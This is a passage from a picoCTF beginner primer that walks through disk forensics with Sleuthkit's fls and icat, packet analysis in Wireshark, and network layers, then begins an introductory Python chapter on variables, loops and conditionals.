                                a lot of potential user influence like <code>root</code> and <code>home</code>. But
                                first, let&#8217;s
                                take a step back and print the help information for <code>fls</code>:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p><code>fls</code> will print some succinct help information if ran with no arguments. This
                                is true for many command line tools and programs, but is not universal.</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls
Missing image name
usage: fls [-adDFlhpruvV] [-f fstype] [-i imgtype] [-b dev_sector_size] [-m dir/] [-o imgoffset] [-z ZONE] [-s seconds] image [images] [inode]
        If [inode] is not given, the root directory is used
        -a: Display &quot;.&quot; and &quot;..&quot; entries
        -d: Display deleted entries only
        -D: Display only directories
        -F: Display only files
        -l: Display long version (like ls -l)
        -i imgtype: Format of image file (use &#39;-i list&#39; for supported types)
        -b dev_sector_size: The size (in bytes) of the device sectors
        -f fstype: File system type (use &#39;-f list&#39; for supported types)
        -m: Display output in mactime input format with
              dir/ as the actual mount point of the image
        -h: Include MD5 checksum hash in mactime output
        -o imgoffset: Offset into image file (in sectors)
        -p: Display full path for each file
        -r: Recurse on directory entries
        -u: Display undeleted entries only
        -v: verbose output to stderr
        -V: Print version
        -z: Time zone of original machine (i.e. EST5EDT or GMT) (only useful with -l)
        -s seconds: Time skew of original machine (in seconds) (only useful with -l &amp; -m)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>The first line after our <code>fls</code> invocation with no arguments is an error
                                message, saying that we failed to include a mandatory argument, the image
                                name. However, <code>fls</code> uses the opportunity to educate us on how to properly
                                invoke it. All arguments in square brackets, i.e. '[' and ']', are optional.
                                Anything not in square brackets is mandatory. After the invocation is a
                                helpful note saying 'If [inode] is not given, the root directory is used'.
                                This is how we first used <code>fls</code>. We supplied no inode and the root directory
                                was printed. But now, we want to look at specific directories so we will need
                                their inodes. Helpfully, <code>fls</code> actually prints those along with file and
                                directory names. It&#8217;s the number on the line with each name, if we look back
                                to our listing of '$ fls -o 360448 disk.flag.img' we can find the inode number
                                for <code>/home</code> which is 451. Let&#8217;s add that to our <code>fls</code> call:
                            </p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls -o 360448 disk.flag.img 451
$</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>This actually seems to do nothing. It&#8217;s not actually doing nothing, there just
                                are no results. <code>/home</code> is an empty folder in the disk image. Let&#8217;s try
                                another directory, <code>/root</code>. Go back and get the inode number and plug it into
                                <code>fls</code>:
                            </p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls -o 360448 disk.flag.img 1995
r/r 2363:       .ash_history
d/d 3981:       my_folder</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>This directory has a file, called <code>.ash_history</code> and a directory named
                                <code>my_folder</code>. Let&#8217;s see what is in 'my_folder'. Use the inode number
                                like
                                before:
                            </p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls -o 360448 disk.flag.img 3981
r/r * 2082(realloc):    flag.txt
r/r 2371:       flag.uni.txt</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>Bingo! Now with the inode number of 'flag.uni.txt' we can print the file using
                                <code>icat</code>:
                            </p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ icat -o 360448 disk.flag.img 2371
picoCTF{by73_5urf3r_adac6cb4}</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>Please be aware that your flag will likely have a different suffix.</p>
                        </div>
                        <div class="paragraph">
                            <p>Now, it&#8217;s good to go back and address what the other file in 'my_folder' was.
                                Its name is flag.txt, why can&#8217;t we <code>icat</code> that file? In short, because
                                the
                                file has been deleted and the inode has even been reassigned to a different
                                file. You can try using <code>icat</code> on the 2082 inode, but it is part of an
                                unrelated file somewhere on the system.</p>
                        </div>
                        <div class="paragraph">
                            <p>If you want to continue to learn about Sleuthkit tools, try this problem:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/137"
                                    class="bare">https://play.picoctf.org/practice/challenge/137</a></p>
                        </div>
                        <div class="paragraph">
                            <p>If you want to use what you know to dive even deeper into a disk, try this
                                problem:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/285"
                                    class="bare">https://play.picoctf.org/practice/challenge/285</a></p>
                        </div>
                        <div class="paragraph">
                            <p>If you get stuck, try reading writeups of the challenges. Just google search
                                'Writeup, [challenge name], picoCTF'. There&#8217;s going to be various levels of
                                quality and depth in writeups, so don&#8217;t feel like you have to stick with the
                                first one you look at.</p>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_packet_analysis">3.4. Packet analysis</h3>
                    <div class="paragraph">
                        <p>Another important field of forensics is packet or network analysis. This field
                            of forensics conerns itself with understanding what has happened on a network
                            through the examination of captured packets. This will require the use of a GUI
                            tool called 'Wireshark', which means you cannot use the webshell to complete
                            this problem. The webshell can be used to complete many introductory problems,
                            but more advanced problems sometimes need a GUI tool to be solved in an
                            efficient manner. Consider this an exercise in installing and using GUI tools.
                            Knowing how to do this will help you greatly in the future.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="installing_wireshark">3.4.1. Installing Wireshark</h4>
                        <div class="paragraph">
                            <p>On your computer, download Wireshark from their site:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://www.wireshark.org/" class="bare">https://www.wireshark.org/</a></p>
                        </div>
                        <div class="paragraph">
                            <p>You must download the version corresponding to your operating system. It should
                                be a straightforward process, however, if you have any issue or doubt, you can
                                Google plenty of good documentation about Wireshark.</p>
                        </div>
                        <div class="paragraph">
                            <p>If you&#8217;re using a Chromebook you will need administrator privileges to enable
                                Linux mode on the device. With Linux mode enabled, you can install Wireshark
                                through apt-get and run it with the Linux terminal.</p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_packet_primer_walkthrough">3.4.2. Packet Primer walkthrough</h4>
                        <div class="paragraph">
                            <p>Consider this picoCTF challenge:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/286"
                                    class="bare">https://play.picoctf.org/practice/challenge/286</a></p>
                        </div>
                        <div class="paragraph">
                            <p>Download the packet capture and open it in Wireshark. It should look like this
                                once you open it. Google how to open a packet capture in Wireshark if you can&#8217;t
                                figure it out by exploring the menus of the tool.</p>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/for-1-open-wireshark.png" alt="for 1 open wireshark">
                            </div>
                            <div class="title">Figure 2. Packet Primer opened in Wireshark</div>
                        </div>
                        <div class="paragraph">
                            <p>Packet analysis is all about filtering, even for this packet capture that is
                                tiny. Most packet captures are going to have thousands if not tens of thousands
                                of packets. This capture has only 9 because it is an introductory problem. You
                                could manually inspect each packet and that wouldn&#8217;t be a bad strategy, but we
                                want to approach this problem more technically, because it is just setting us
                                up for future problems that have thousands of packets.</p>
                        </div>
                        <div class="paragraph">
                            <p>So, we know that the flag is unlikely to be in the ARP messages as these are
                                just messages relating IP addresses and hardware addresses. To filter out ARP
                                messages, add <code>!arp</code> to your filter in Wireshark:</p>
                        </div>
                        <div class="admonitionblock note">
                            <table>
                                <tr>
                                    <td class="icon">
                                        <i class="fa icon-note" title="Note"></i>
                                    </td>
                                    <td class="content">
                                        'ARP' stands for Address Resolution Protocol and these messages are
                                        common in every network capture as it is needed to connect a hardware address
                                        to an IP address.
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/for-2-arp-filter.png" alt="for 2 arp filter">
                            </div>
                            <div class="title">Figure 3. Packet filter to discard ARP messages</div>
                        </div>
                        <div class="paragraph">
                            <p>Of the remaining 5 packets, the first 3 are the TCP handshake and so they can
                                be ignored. Of the remaining 2 packets, let&#8217;s look at the one that has the PSH
                                flag set, which means there is data for the application in the packet:</p>
                        </div>
                        <div class="admonitionblock note">
                            <table>
                                <tr>
                                    <td class="icon">
                                        <i class="fa icon-note" title="Note"></i>
                                    </td>
                                    <td class="content">
                                        The TCP handshake, also known as the 'three-way handshake' can be
                                        identified by the flags in the packets. First 'SYN' from host A, the 'SYN, ACK'
                                        from host B, then finally, 'ACK' from host A. 'SYN' stands for synchronization,
                                        and 'ACK' stands for acknowledgement. Both parties synchronize and acknowledge.
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/for-3-psh-packet.png" alt="for 3 psh packet">
                            </div>
                            <div class="title">Figure 4. Packet with PSH flag set</div>
                        </div>
                        <div class="paragraph">
                            <p>When you click on packet 4, you should see the flag in the packet bytes pane,
                                you may have to scroll down to see it all:</p>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/for-4-packet-flag.png" alt="for 4 packet flag">
                            </div>
                            <div class="title">Figure 5. Flag in packet bytes pane</div>
                        </div>
                        <div class="paragraph">
                            <p>Remember, your flag might be different than mine. It would be good to notice
                                that there was something different about the packet with the flag from the
                                beginning. It has a protocol of 'S101', and it&#8217;s the only one. Such glaring
                                oddities should always be examined. Sometimes, the only clue in a packet
                                analysis problem is a small difference between the flag packet and the rest of
                                the thousands of packets. A good strategy is to filter as many packets as you
                                can, then look for oddities. I should note also that there is not always a
                                'flag packet'. Sometimes a flag can span across multiple packets, just like
                                packet payloads can span across multiple packets.</p>
                        </div>
                        <div class="admonitionblock note">
                            <table>
                                <tr>
                                    <td class="icon">
                                        <i class="fa icon-note" title="Note"></i>
                                    </td>
                                    <td class="content">
                                        'S101' is an uncommon protocol. The packet isn&#8217;t really speaking S101, it
                                        is just using the preferred port of the protocol, port 9000.
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <div class="paragraph">
                            <p>Leave your packet capture open if you can. We are going to use it to illustrate
                                concepts introduced in the next section.</p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="network_layers">3.4.3. Network Layers</h4>
                        <div class="paragraph">
                            <p>We&#8217;ll now cover some background to deepen your understanding of packets and
                                networks. The networks we commonly use today, are broken down into different
                                layers. This design by layers assigns responsibilities to each layer to
                                accomplish something. It is good to have a design by layers for several
                                reasons. For example, if network engineers want to make a change in one of the
                                layers, the impact on the other layers is minimized. Another example, is that
                                if you are a programmer and want to connect your application with a server, you
                                do not necessarily need to care if the user is using wifi or ethernet cable, or
                                how the user is connecting to the internet. Your application can simply trust
                                other layers are going to take care of that and your application will have a
                                successful connection. These are the layers, viewed in a top down approach.</p>
                        </div>
                        <div class="olist arabic">
                            <ol class="arabic">
                                <li>
                                    <p>Application layer: Responsible for handling data traffic between
                                        applications. HTTP belongs to this layer; HTTP protocol is commonly used to
                                        obtain Web Pages. In the Packets Primer capture, click the fourth packet. This
                                        packet&#8217;s application layer is called 'Data' in the middle pane. Click the
                                        arrow
                                        to expand the view of the layer. There&#8217;s not much in this display because
                                        the
                                        application data is just the flag. Other layers will break down all the fields
                                        of a layer, showing the value for each one in the packet.</p>
                                    <div class="imageblock text-center">
                                        <div class="content">
                                            <img src="images/for-5-app-layer.png" alt="for 5 app layer">
                                        </div>
                                        <div class="title">Figure 6. Application layer expanded</div>
                                    </div>
                                </li>
                                <li>
                                    <p>Transport layer: Responsible for providing several connections on the same
                                        host, that means that you can have several applications on the same device and
                                        each of them can have a different connection even if it is just one device. It
                                        also defines functionalities for reliable transport. Two protocols are used on
                                        this layer. TCP (Transport Control Protocol). You use this protocol when you
                                        need to have reliable transport, this makes sure that if a piece of information
                                        was missing while being transfertransferred it is resent. HTTP from the
                                        Application layer, runs on top of TCP, because when you visit a Web Page you
                                        want to have every part of it accurately. On the other hand, when you dont
                                        need reliable transport, but you want faster transport that does not resend
                                        parts that were missing, UDP (User Datagram Protocol) is used. An example when
                                        UDP is needed is for voice communication. When you are talking if a little part
                                        of the audio is missing, you do not want it to appear later in the
                                        communication because that would confuse the listener. The listener can still
                                        understand what you are saying if the part missing is small enough. Since UDP
                                        has no controls for transport, it is faster than TCP. This layer assigns a port
                                        to each connection, and that is how it tells the difference between connections
                                        in the same computer, because of the port.</p>
                                </li>
                                <li>
                                    <p>Network layer: It provides devices with an address in the network called the
                                        IP (Internet Protocol) address, and routes information through different
                                        routers. It provides mapping between all the computers connected to the
                                        internet. When you connect to a network in some specific place, an IP is
                                        assigned to your device.</p>
                                </li>
                                <li>
                                    <p>Data link layer: It provides communication between devices that are connected
                                        directly. Examples of protocols in the data link layer are Ethernet or WiFi.
                                        You generally use WiFi to send messages to your router directly without any
                                        other devices in between. Each device has a physical address in wifi or
                                        ethernet, known as the mac address. The mac address is used for this layer.
                                        This is not an address like the IP that can change depending on the network you
                                        are connected to. The mac address is assigned to the hardware of your network
                                        card when it is manufactured.</p>
                                </li>
                                <li>
                                    <p>Physical layer: This handles electrical pulses on the wire that represent
                                        bits.</p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_programming_in_python">4. Programming in python</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>A computer program is a set of instructions that allow us to do a task
                        automatically on a computer. We can make a computer program in a programming
                        language. Computer programs are generally called "software". With a computer
                        program we can do all sorts of things. Some examples are calculators, video
                        games, text processors, browsers, and all the things you have ever used in a
                        computer. Nowadays, there are computers everywhere. Any device such as a cell
                        phone, smart watch, or modern car is running software that was made in
                        programming. To begin, we are going to learn python, which is one of the
                        easiest programming languages to learn.</p>
                </div>
                <div class="paragraph">
                    <p>Lets begin writing python! We are not going to explain each detail of python
                        independently. For that, you could read the python documentation, which is
                        located here:</p>
                </div>
                <div class="paragraph">
                    <p><a
                            href="https://docs.python.org/3.9/tutorial/index.html">https://docs.python.org/3.9/tutorial/index.html</a>
                    </p>
                </div>
                <div class="paragraph">
                    <p>However, if you dont know any programming, going directly to the documentation
                        can be overwhelming. We are just going to explain some parts of python which
                        are a good start to begin to write your own programs to exploit software. We do
                        this by making examples that achieve one objective and we explain how they work
                        along the way. This will allow you to read code written by someone else, of
                        course, with the help of google if they use elements that you did not know
                        previously.</p>
                </div>
                <div class="paragraph">
                    <p>When you are learning a programming language, there is a tradition in which the
                        first program you write simply prints "Hello World!"" on the screen. We will be
                        using python 3, the number 3 is the version of python. Lets start doing the
                        "hello world!" program.</p>
                </div>
                <div class="paragraph">
                    <p>Open your shell, go to your home directory, and create a folder called
                        "python_examples". You can do it with the following lines:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>$ cd
$ mkdir python_examples</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Now, access that folder using</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="text"><span></span>$ cd python_examples</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Create a file called "helloworld.py", you can do it with:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="text"><span></span>$ nano helloworld.py</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>To make our 'hello world!' program in python requires just one line of code! Simply write this on
                        the file:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Hello World!&quot;</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Now save the file in nano by pressing 'control' and 'x' at the same time, and then press 'y',
                        then 'enter'.</p>
                </div>
                <div class="paragraph">
                    <p>Run the program on the terminal with:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="text"><span></span>$ python3 helloworld.py</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>You should see that "Hello World!" is printed on the screen when you run it:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>$ python3 helloworld.py
Hello World!</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>That was our first program in python!</p>
                </div>
                <div class="paragraph">
                    <p>Python, as any other programming language, has variables. A variable can hold
                        different types of data. What we just printed on the screen was a string of
                        characters. When we enclose something in quotes, we are telling python it is a
                        string of characters. A string is a data type. In python, to create a variable
                        we simply choose a name and assign the value that we want. For example, we are
                        going to create a variable called my_string, and we are going to assign to that
                        variable the value "Hello World!":</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">my_string</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;Hello World!&quot;</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>That line of code makes the variable my_string equal to "Hello World!". In
                        python programming, the symbol = is used to assign the value from the right
                        side of the equal to the variable at the left side. Variables can have any name
                        we like, except some specific words that are reserved for python instructions.
                        For example, the word 'print' is reserved, so you cannot use it as a variable
                        name.</p>
                </div>
                <div class="paragraph">
                    <p>Now, if we print the variable, it should print "Hello World!". Do that
                        experiment next. The python script should look like this:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">my_string</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;Hello World!&quot;</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">my_string</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Run it and you will see "Hello World!"" printed on the screen again.</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>Hello World!</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>You can also assign numbers to variables and do mathematical operations between
                        them. Lets make a simple program that calculates the area of a square. Create
                        a file called "area.py" and write the following:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">side1</span> <span class="tok-o">=</span> <span class="tok-mi">4</span>
<span class="tok-n">side2</span> <span class="tok-o">=</span> <span class="tok-mi">8</span>
<span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">side1</span> <span class="tok-o">*</span> <span class="tok-n">side2</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>If you run that script, what do you think is going to print?</p>
                </div>
                <div class="paragraph">
                    <p>When you run it you should see:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>32</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Those were very trivial examples. Now, suppose you want to print a list of 20
                        numbers that starts at 0 and ends at 19. We can do that in just a couple of
                        lines, instead of writing 20 prints! Create a file called loop.py and use the
                        following code:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">20</span><span class="tok-p">):</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Run it and you should see:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>We have introduced the concept of a python loop. The word 'for' is used to
                        declare a 'for loop', which is a loop that iterates in a range of numbers. The
                        'i' next to 'for', is a variable that will be incremented on each iteration on
                        a range of 20. We can change the range for a bigger one or a smaller one by
                        changing the number inside the parenthesis. Note that a line of code will be
                        inside the loop, if it is indented by four spaces. For example, run this:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">10</span><span class="tok-p">):</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am inside the loop&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am OUTSIDE&quot;</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>You will see:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>I am inside the loop
0
I am inside the loop
1
I am inside the loop
2
I am inside the loop
3
I am inside the loop
4
I am inside the loop
5
I am inside the loop
6
I am inside the loop
7
I am inside the loop
8
I am inside the loop
9
I am OUTSIDE</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Note that the string "I am OUTSIDE" was printed only once, because it is
                        outside the loop. To be inside the loop the code needs to be indented by 4
                        spaces, as we said. Once we use a line of code that is not indented for the
                        first time after the loop, that is considered the end of the loop. If you try
                        to indent a line after the loop has finished, like this:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">20</span><span class="tok-p">):</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am inside the loop&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am outside&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am outside 2&quot;</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>That would cause a syntax error when you run it. A syntax error means that the
                        code is not complying with the way python should be written. In this case,
                        would specifically show an indentation error:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>python3 helloworld.py
  File &quot;helloworld.py&quot;, line 5
    print(&quot;I am outside 2&quot;)
    ^
IndentationError: unexpected indent</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>That happens because we put an indentation, and the for loop was already
                        closed. Syntax errors at the beginning can happen to you by accident and you
                        might not fix them very easily, but with a little time you will begin to fix
                        them quickly if they happen. To practice, spot the syntax error in the
                        following code:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">20</span><span class="tok-p">):</span>
    <span class="tok-n">prin</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am inside the loop&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am outside&quot;</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>What is the error?</p>
                </div>
                <div class="paragraph">
                    <p>Run it to see what happens. It will show:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>python3 helloworld.py
  File &quot;helloworld.py&quot;, line 2
    prin(&quot;I am inside the loop&quot;)
                              ^
SyntaxError: invalid syntax</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Python shows you the line with the error, but not the exact location. In this
                        case we missed the 't' from 'print'. Another error might be that the colon from
                        the for loop is missing:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">20</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am inside the loop&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;I am outside&quot;</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>In that case it will show you:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>python3 helloworld.py
  File &quot;helloworld.py&quot;, line 1
    for i in range(20)
                     ^
SyntaxError: invalid syntax</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>If you add the missing colon after range(20), the program should work. A syntax
                        error can happen because any reserved word is misspelled; remember that
                        reserved words are words that python recognize as instructions. For example,
                        'print', 'for', 'in' are reserved words in our program. Additionally, a syntax
                        error can happen because of a missing symbol such as a colon.</p>
                </div>
                <div class="paragraph">
                    <p>As a challenge, implement a program that prints your name 10 times, and below
                        your name prints a number starting at 100 and ends at 109. The output of your
                        program should look similar to:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>Samuel
100
Samuel
101
Samuel
102
Samuel
103
Samuel
104
Samuel
105
Samuel
106
Samuel
107
Samuel
108
Samuel
109</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Hint: use range(100, 110).</p>
                </div>
                <div class="paragraph">
                    <p>Once you are done with the previous challenge, fix the following program that
                        has several syntax errors and make it work:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-n">inn</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">10</span><span class="tok-p">:</span>
    <span class="tok-n">prnt</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>The program should print the numbers from 0 to 9.</p>
                </div>
                <div class="paragraph">
                    <p>So far, we have seen how a computer can repeat an instruction several times,
                        which is something fundamental in a computer. We want computers to do
                        repetitive tasks for us. Another fundamental functionality we want in computers
                        is conditional clauses. A conditional clause means that a program will do an
                        action only if a condition is met or take another path if the condition is not
                        met. For example, suppose you are printing the numbers from 0 to 9, and you
                        want to print a message when the number is less than 5 and another message when
                        the number is equal or greater than 5. You would do it in the following manner:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">10</span><span class="tok-p">):</span>
    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&lt;</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is less than 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&gt;=</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is greater than or equal to 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Run it and verify the results. We have introduced an if-clause, which is a
                        conditional clause. Note that all the code is inside the loop. The first
                        message is inside the first if-clause, that is only fulfilled when 'i' is less
                        than 5. The second message is inside the second if-clause, which is only
                        fulfilled when the 'i' is greater than or equal to 5. At last, we print the
                        variable 'i', which is not inside any if-clause, so it is always printed.</p>
                </div>
                <div class="paragraph">
                    <p>Another way to implement this program, is using an 'else':</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre
                            class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">10</span><span class="tok-p">):</span>
    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&lt;</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is less than 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is greater than or equal to 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                    </div>
                </div>
                <div class="paragraph">
